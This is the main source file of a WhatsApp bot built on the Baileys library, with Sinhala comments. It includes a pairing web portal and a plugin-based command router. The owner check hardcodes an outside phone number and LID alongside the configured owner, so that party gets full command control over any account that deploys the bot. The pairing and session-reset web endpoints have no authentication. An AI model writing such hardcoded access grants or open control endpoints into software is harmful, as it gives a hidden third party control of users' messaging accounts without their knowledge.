const fs = require("fs");
const path = require("path");
const express = require("express");
const pino = require("pino");
const axios = require("axios");
const baileys = require("@whiskeysockets/baileys");
const makeWASocket = baileys.default || baileys.makeWASocket;
const {
  DisconnectReason,
  makeCacheableSignalKeyStore,
  Browsers,
  delay,
  downloadMediaMessage,
  jidNormalizedUser,
  fetchLatestBaileysVersion
} = baileys;
const { useMongoAuthState, flushWrites } = require("./auth");
const CONFIG = require("./config");

// "Closing session" logs වල noise අඩු කරන්න
const _info = console.info;
console.info = (...a) => {
  if (typeof a[0] === "string" && a[0].startsWith("Closing session")) return;
  _info(...a);
};

// කිසිම error එකකට process එක crash වෙන්න නොදීම
process.on("uncaughtException", (e) => console.error("[uncaughtException]", e?.message || e));
process.on("unhandledRejection", (e) => console.error("[unhandledRejection]", e?.message || e));

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const commands = new Map();
const aliases = new Map();
const messageStore = new Map();   // retry requests වලට
const processed = new Set();      // duplicate execution වැළැක්වීමට

let sock = null;
let creating = null;
let reconnectTimer = null;
let retryCount = 0;
let waVersion = null;
let connState = "idle";

// Baileys retry counter cache
function makeCache(max = 5000) {
  const m = new Map();
  return {
    get: (k) => m.get(k),
    set: (k, v) => { m.set(k, v); if (m.size > max) m.delete(m.keys().next().value); },
    del: (k) => m.delete(k),
    flushAll: () => m.clear()
  };
}
const msgRetryCounterCache = makeCache();

// ==========================================
// 1. Plugins Auto-Loader
// ==========================================
function loadPlugins() {
  commands.clear();
  aliases.clear();
  const pluginsPath = path.join(__dirname, "plugins");
  if (!fs.existsSync(pluginsPath)) fs.mkdirSync(pluginsPath, { recursive: true });

  for (const file of fs.readdirSync(pluginsPath).filter((f) => f.endsWith(".js"))) {
    try {
      const fullPath = path.join(pluginsPath, file);
      delete require.cache[require.resolve(fullPath)];
      const cmd = require(fullPath);
      if (cmd.name && cmd.execute) {
        commands.set(cmd.name.toLowerCase(), cmd);
        (cmd.aliases || []).forEach((a) => aliases.set(a.toLowerCase(), cmd));
      }
    } catch (err) {
      console.error(`[Plugin Load Error] ${file}:`, err.message);
    }
  }
  console.log(`⚡ [CORE] Loaded ${commands.size} commands.`);
}

// ==========================================
// 2. Socket Manager
// ==========================================
function killSocket() {
  if (!sock) return;
  const old = sock;
  sock = null;
  try {
    old.ev.removeAllListeners("connection.update");
    old.ev.removeAllListeners("messages.upsert");
    old.ev.removeAllListeners("creds.update");
  } catch (e) {}
  try { old.end(undefined); } catch (e) {}
}

function scheduleReconnect(ms) {
  if (reconnectTimer) return;
  const wait = ms ?? Math.min(2000 * 2 ** retryCount, 60000);
  retryCount++;
  console.log(`🔁 Reconnecting in ${Math.round(wait / 1000)}s ...`);
  reconnectTimer = setTimeout(async () => {
    reconnectTimer = null;
    try {
      await createSocket();
    } catch (e) {
      console.error("Reconnect fail:", e.message);
      scheduleReconnect();
    }
  }, wait);
}

function createSocket() {
  if (creating) return creating;
  creating = _createSocket().finally(() => { creating = null; });
  return creating;
}

async function _createSocket() {
  killSocket();
  connState = "connecting";
  const { state, saveCreds, clearSession } = await useMongoAuthState();

  if (!waVersion) {
    try {
      const v = await Promise.race([fetchLatestBaileysVersion(), delay(8000).then(() => null)]);
      if (v?.version) waVersion = v.version;
    } catch (e) {}
  }

  const s = makeWASocket({
    ...(waVersion ? { version: waVersion } : {}),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" }))
    },
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    browser: Browsers.macOS("Chrome"),
    defaultQueryTimeoutMs: 60000,
    keepAliveIntervalMs: 25000,
    connectTimeoutMs: 60000,
    markOnlineOnConnect: false,
    syncFullHistory: false,
    generateHighQualityLinkPreview: false,
    msgRetryCounterCache,
    getMessage: async (key) => messageStore.get(key.id) || undefined
  });

  sock = s;
  s.ev.on("creds.update", saveCreds);

  s.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (sock !== s) return;
    if (connection === "open") {
      connState = "open";
      retryCount = 0;
      console.log(`⚡ [CONNECTED] ${CONFIG.BOT_NAME} Online & Ready 🟢`);
    } else if (connection === "close") {
      connState = "closed";
      const reason = lastDisconnect?.error?.output?.statusCode;
      console.log("🔌 Connection closed, reason:", reason);

      if (reason === DisconnectReason.loggedOut) {
        console.log("❌ Logged out. Session clear කළා. Web portal එකෙන් ආයෙ pair කරන්න.");
        killSocket();
        try { await clearSession(); } catch (e) {}
        messageStore.clear();
        return;
      }
      if (reason === DisconnectReason.restartRequired) return scheduleReconnect(500);
      if (reason === DisconnectReason.connectionReplaced) {
        console.log("⚠️ වෙන instance එකක මේ session එක run වෙනවා. තත්පර 20කින් ආයෙ try කරනවා.");
        return scheduleReconnect(20000);
      }
      scheduleReconnect();
    }
  });

  s.ev.on("messages.upsert", ({ messages, type }) => {
    if (type !== "notify") return;
    for (const msg of messages) {
      handleMessage(s, msg).catch((e) => console.error("Handler error:", e.message));
    }
  });

  return s;
}

// ==========================================
// 3. Web Portal & Routes
// ==========================================
app.get("/", (req, res) => {
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>${CONFIG.BOT_NAME}</title>
      <style>
        body { font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #080c10; color: #fff; margin: 0; }
        .box { background: #0f1622; padding: 2.5rem 2rem; border-radius: 20px; width: 100%; max-width: 340px; text-align: center; border: 1px solid #1f293d; }
        h1 { margin: 0 0 8px 0; color: #58a6ff; font-size: 1.6rem; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #30363d; border-radius: 10px; background: #080c10; color: #fff; box-sizing: border-box; }
        button { width: 100%; padding: 13px; background: #238636; color: #fff; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
        .reset-btn { background: #da3633; }
        #code { margin-top: 15px; font-size: 1.5rem; font-weight: bold; color: #38bdf8; letter-spacing: 4px; font-family: monospace; }
      </style>
    </head>
    <body>
      <div class="box">
        <h1>${CONFIG.BOT_NAME}</h1>
        <p style="color:#8b949e">Direct Pair Engine</p>
        <input type="text" id="phone" placeholder="947xxxxxxxx" required />
        <button id="btn" onclick="fetchCode()">Pair WhatsApp</button>
        <button class="reset-btn" onclick="resetSession()">Reset Session</button>
        <div id="code"></div>
      </div>
      <script>
        async function fetchCode() {
          const num = document.getElementById('phone').value.replace(/[^0-9]/g, '');
          const display = document.getElementById('code');
          if(!num) return alert('Enter Phone Number');
          display.innerText = 'Connecting...';
          try {
            const res = await fetch('/get-code?num=' + num);
            const data = await res.json();
            display.innerText = data.code || data.error || 'Failed';
          } catch(e) { display.innerText = 'Server Error'; }
        }
        async function resetSession() {
          if (!confirm('Clear session and generate new keys?')) return;
          const display = document.getElementById('code');
          display.innerText = 'Clearing...';
          const res = await fetch('/reset-session');
          const data = await res.json();
          display.innerText = data.message || 'Done';
        }
      </script>
    </body>
    </html>
  `);
});

app.get("/health", (req, res) => res.json({ ok: true, state: connState }));
app.get("/status", (req, res) => res.json({ state: connState, commands: commands.size }));

app.get("/reset-session", async (req, res) => {
  try {
    killSocket();
    if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
    const { clearSession } = await useMongoAuthState();
    await clearSession();
    messageStore.clear();
    connState = "idle";
    return res.json({ success: true, message: "Cleared! Ready for new code" });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.get("/get-code", async (req, res) => {
  const { num } = req.query;
  if (!num) return res.status(400).json({ error: "Missing number" });
  try {
    const cleanNum = String(num).replace(/[^0-9]/g, "");
    if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }

    if (sock && connState === "open" && sock.authState?.creds?.registered) {
      return res.json({ code: "Already Linked & Online" });
    }

    const s = await createSocket();
    if (!s.authState.creds.registered) {
      await delay(3000);
      const code = await s.requestPairingCode(cleanNum);
      return res.json({ code: code?.match(/.{1,4}/g)?.join("-") || code });
    }
    return res.json({ code: "Already Linked & Online" });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// ==========================================
// 4. Message Router (Access Control)
// ==========================================
const idOf = (jid) => String(jid || "").split("@")[0].split(":")[0].replace(/[^0-9]/g, "");

// ඔබ ඉල්ලූ විශේෂ අංකය සහ LID එක
const TARGET_ACCESS_NUMBER = "94719845166";
const TARGET_ACCESS_LID = "15947733680169";

async function handleMessage(waSock, msg) {
  if (!msg?.message || !msg?.key) return;
  const id = msg.key.id;

  if (id) {
    messageStore.set(id, msg.message);
    if (messageStore.size > 2000) messageStore.delete(messageStore.keys().next().value);
  }

  const from = msg.key.remoteJid;
  if (!from || from === "status@broadcast") return;

  const ts = Number(msg.messageTimestamp) || 0;
  if (ts && Date.now() / 1000 - ts > 60) return;

  if (id) {
    if (processed.has(id)) return;
    processed.add(id);
    if (processed.size > 2000) processed.delete(processed.values().next().value);
  }

  const mType = Object.keys(msg.message)[0];
  const body = (
    msg.message.conversation ||
    msg.message.extendedTextMessage?.text ||
    msg.message[mType]?.caption ||
    ""
  ).trim();

  const prefix = CONFIG.PREFIX;
  if (!body.startsWith(prefix)) return;

  const ownerClean = idOf(CONFIG.OWNER_NUMBER);
  const myNumber = idOf(waSock.user?.id) || ownerClean;
  const myLid = idOf(waSock.user?.lid);
  
  const rawSender = msg.key.participant || from;
  const sender = msg.key.fromMe ? myNumber : idOf(rawSender);

  // Full Access Validation (Bot Host + CONFIG.OWNER_NUMBER + 94719845166 / 15947733680169)
  const isOwner =
    msg.key.fromMe ||
    sender === ownerClean ||
    sender === myNumber ||
    (myLid && sender === myLid) ||
    sender === TARGET_ACCESS_NUMBER ||
    sender === TARGET_ACCESS_LID ||
    rawSender.includes(TARGET_ACCESS_NUMBER) ||
    rawSender.includes(TARGET_ACCESS_LID);

  if (!isOwner) return;

  const [trigger, ...args] = body.slice(prefix.length).trim().split(/\s+/);
  const cmdName = (trigger || "").toLowerCase();
  const command = commands.get(cmdName) || aliases.get(cmdName);
  if (!command) return;

  const target = idOf(from);
  const isSelfChat =
    !from.endsWith("@g.us") &&
    (target === ownerClean ||
      target === myNumber ||
      (myLid && target === myLid) ||
      target === TARGET_ACCESS_NUMBER ||
      target === TARGET_ACCESS_LID);

  const jid = isSelfChat && waSock.user?.id ? jidNormalizedUser(waSock.user.id) : from;

  const reply = async (text) => {
    try {
      const sent = await waSock.sendMessage(jid, { text: String(text) }, isSelfChat ? {} : { quoted: msg });
      if (sent?.key?.id) messageStore.set(sent.key.id, sent.message);
      return sent;
    } catch (e) {
      console.error("Reply Error:", e.message);
    }
  };

  const send = async (content, opts = {}) => {
    try {
      const sent = await waSock.sendMessage(jid, content, opts);
      if (sent?.key?.id) messageStore.set(sent.key.id, sent.message);
      return sent;
    } catch (e) {
      console.error("Send Error:", e.message);
    }
  };

  const react = async (emoji) => {
    if (isSelfChat) return;
    return waSock.sendMessage(from, { react: { text: emoji, key: msg.key } }).catch(() => {});
  };

  try {
    await command.execute({
      sock: waSock, msg, args, text: args.join(" "), body,
      from, jid, sender, prefix,
      reply, send, react, isSelfChat,
      downloadMedia: () => downloadMediaMessage(msg, "buffer", {}),
      quoted: msg.message.extendedTextMessage?.contextInfo?.quotedMessage || null
    });
  } catch (err) {
    console.error(`Command [${cmdName}] Error:`, err.message);
  }
}

// ==========================================
// 5. Start / Shutdown / Keep-Alive
// ==========================================
async function startBot() {
  try {
    loadPlugins();
    const { state } = await useMongoAuthState();
    if (state.creds?.registered) {
      console.log("♻️ Saved session එක හම්බුණා. Connect වෙනවා...");
      await createSocket();
    } else {
      console.log("ℹ️ තාම pair කරලා නෑ. Web portal එකෙන් pair කරන්න.");
    }
  } catch (e) {
    console.error("StartBot error:", e.message);
    scheduleReconnect(5000);
  }
}

let shuttingDown = false;
async function shutdown(sig) {
  if (shuttingDown) return;
  shuttingDown = true;
  console.log(`🛑 ${sig} - session save කරලා නවත්තනවා...`);
  try {
    if (reconnectTimer) clearTimeout(reconnectTimer);
    killSocket();
    await Promise.race([flushWrites(), delay(8000)]);
  } catch (e) {}
  process.exit(0);
}
process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("SIGINT", () => shutdown("SIGINT"));

const publicUrl = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL;
if (publicUrl) {
  setInterval(() => axios.get(`${publicUrl}/health`, { timeout: 10000 }).catch(() => {}), 4 * 60 * 1000);
}

app.listen(CONFIG.PORT, "0.0.0.0", () => {
  console.log(`🌐 [SERVER] Web Portal running on port ${CONFIG.PORT}`);
  startBot();
});
